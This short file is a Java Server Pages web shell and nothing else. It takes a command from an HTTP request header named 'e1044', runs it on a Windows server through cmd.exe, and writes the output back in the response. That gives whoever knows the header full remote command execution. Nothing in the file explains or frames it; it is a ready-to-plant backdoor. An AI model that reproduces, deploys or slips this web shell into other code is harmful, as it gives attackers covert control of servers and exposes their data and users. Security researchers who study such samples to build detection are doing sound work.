<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getHeader("e1044") != null) {
        Process p = Runtime.getRuntime().exec("cmd.exe /c "+request.getHeader("e1044"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
